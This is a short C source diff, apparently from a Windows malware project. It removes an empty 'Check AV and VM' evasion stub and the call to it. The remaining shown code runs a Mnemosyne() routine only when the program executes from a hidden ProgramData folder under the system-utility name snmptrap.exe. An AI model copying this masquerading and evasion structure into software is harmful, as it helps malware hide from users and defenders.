@@ -152,14 +152,6 @@ void Install()
 }
 
 /*
-	Check AV and VM
-*/
-void Protection()
-{
-
-}
-
-/*
 	Init
 */
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -168,7 +160,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	{
 		if (strcmp(GetFullPath(), "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe") == 0)
 		{
-			Protection();
 			Mnemosyne();
 		}
 		else
